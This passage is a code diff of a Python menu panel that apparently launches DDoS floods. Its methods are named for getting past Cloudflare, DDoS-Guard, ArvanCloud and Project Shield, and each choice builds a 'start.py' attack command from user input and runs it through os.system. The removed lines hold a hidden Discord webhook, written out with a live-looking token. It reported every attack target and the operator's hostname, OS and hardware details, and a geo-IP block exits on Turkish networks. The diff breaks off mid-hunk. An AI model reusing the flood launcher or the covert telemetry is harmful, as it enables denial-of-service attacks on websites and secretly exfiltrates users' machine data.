@@ -10,8 +10,6 @@ import json
 import socket
 import platform
 import psutil
-from discord_logger import DiscordLogger
-from discord_webhook import DiscordWebhook, DiscordEmbed
 import speedtest
 import datetime
 import time
@@ -105,95 +103,7 @@ logoblocked = f"""
 {developerx}
 
 """
-def logdiscord():
-    try:
-        api = r.get("http://ip-api.com/json/")
-        apijson = json.loads(api.text)
-        blocknetworkIPS = apijson['query']
 
-        bypassVPN = r.get(f"http://ip-api.com/json/{blocknetworkIPS}")
-        apijsonroot = json.loads(bypassVPN.text)
-
-        bypassROOTED = apijsonroot['query']
-        country = apijsonroot['country']
-        webhook_url = "https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU"
-        options = {
-        "application_name": "Scorpion-Hackz.com | API",
-        "service_name": "Backend API",
-        "service_icon_url": "https://media.tenor.com/images/e35b47b0d497cf46989512d0015fa8dc/tenor.gif",
-        "service_environment": "Block banned networks.",
-        "default_level": "info",
-}
-
-        logger = DiscordLogger(webhook_url=webhook_url, **options)
-        logger.construct(
-        title="Backend Network API",
-        description="Successfully protected the panel against Turkish Networks",
-        level="success",
-        metadata={
-        "Blocked Network:": {
-            f"Bypassed IP": {bypassROOTED},
-            f"Host": {hostname}
-        },
-        "Blocked": "Yes",
-    },
-)   
-        
-        response = logger.send()
-    except KeyboardInterrupt:
-            print('Keyboard Interruption')
-            load()
-            license()
-            menu()
-    except EOFError:
-            print('EOF Error')
-            load()
-            license()
-            menu()  
-    except FileExistsError:
-        print("File Exist")
-        os.system('sudo rm -r proxies.txt')
-        load()
-        license()
-        menu()
-def blocknetworks():
-    try:
-        while True:
-            print(logov)
-            api = r.get("http://ip-api.com/json/")
-            apijson = json.loads(api.text)
-            blocknetworkIPS = apijson['query']
-
-            bypassVPN = r.get(f"http://ip-api.com/json/{blocknetworkIPS}")
-            apijsonroot = json.loads(bypassVPN.text)
-            blocknetworkBYPASS = apijson['country']
-            if blocknetworkBYPASS == "Turkey":
-                print(f'{indicatorlogo}\033[31mTurkish \033[0m\033[36mVPS \033[1m&\033[0m \033[96mNetworks \033[31m\033[1mBlocked\033[0m\n')
-                logdiscord()
-                sys.exit()
-                
-
-            else:
-                break
-            
-    except KeyboardInterrupt:
-        print('Keyboard Interruption')
-        load()
-        license()
-        menu()
-    except EOFError:
-        print('EOF Error')
-        load()
-        license()
-        menu()  
-    except FileExistsError:
-        print("File Exist")
-        os.system('sudo rm -r proxies.txt')
-        load()
-        license()
-        menu()
-
-blocknetworks()
 
 
 def update():
@@ -298,7 +208,7 @@ def load():
 
 \033[1m\033[31m⮞ \033[31mMethod \033[0m\033[31mDev\033[96m'\033[31ms\033[96m:\033[0m
 \033[96m\033[1mMhProDev \033[0m\033[31m, \033[96mGoogleAdmin
-\033[96mEmpFaked \033[31m\033[1m, \033[96mwachirachoomsiri\033[0m \033[31m\033[1m& \033[0m\033[96mR00tS3c\033[0m  
+\033[96mEmpFaked \033[31m\033[1m, \033[96mwachirachoomsiri\033[0m   \033[31m\033[1m& \033[0m\033[96mR00tS3c\033[0m  
 
 """
         logoexpired = f"""
@@ -403,6 +313,8 @@ def tip():
     try:
         print(
         "\033[1m\033[31m> \033[0m\033[96mAttack Started\033[31m CTRL + C to go back Menu")
+        print(
+        f"\033[1m\033[31m> \033[0m\033[96mVPS Speed:\033[31m {speedtestbaba}")
     except KeyboardInterrupt:
         print("Keyboard Interrupt")
         load()
@@ -552,89 +464,8 @@ def menu():
                     mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                     mhgetsend = ('python3 start.py bypass ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embed.add_embed_field(name='Method:', value='mh-normalbypass')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(mhgetsend)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                    embedx.add_embed_field(name='Method:', value='mh-normalbypass')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -652,89 +483,9 @@ def menu():
                     mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                     mhgetsend = ('python3 start.py cfb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embed.add_embed_field(name='Method:', value='mh-cfbypass')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(mhgetsend)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embedx.add_embed_field(name='Method:', value='mh-cfbypass')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -752,89 +503,9 @@ def menu():
                     mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                     mhgetsend = ('python3 start.py dgb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embed.add_embed_field(name='Method:', value='mh-ddosguard')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(mhgetsend)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embedx.add_embed_field(name='Method:', value='mh-ddosguard')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -852,89 +523,9 @@ def menu():
                     mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                     mhgetsend = ('python3 start.py avb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embed.add_embed_field(name='Method:', value='mh-arvancloud')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(mhgetsend)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embedx.add_embed_field(name='Method:', value='mh-arvancloud')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -952,89 +543,9 @@ def menu():
                     mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                     mhgetsend = ('python3 start.py gsb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embed.add_embed_field(name='Method:', value='mh-projectshield')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(mhgetsend)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embedx.add_embed_field(name='Method:', value='mh-projectshield')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -1052,89 +563,10 @@ def menu():
                     mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                     mhgetsend = ('python3 start.py even ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embed.add_embed_field(name='Method:', value='mh-even')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
+                    
                     os.system(mhgetsend)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embedx.add_embed_field(name='Method:', value='mh-even')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
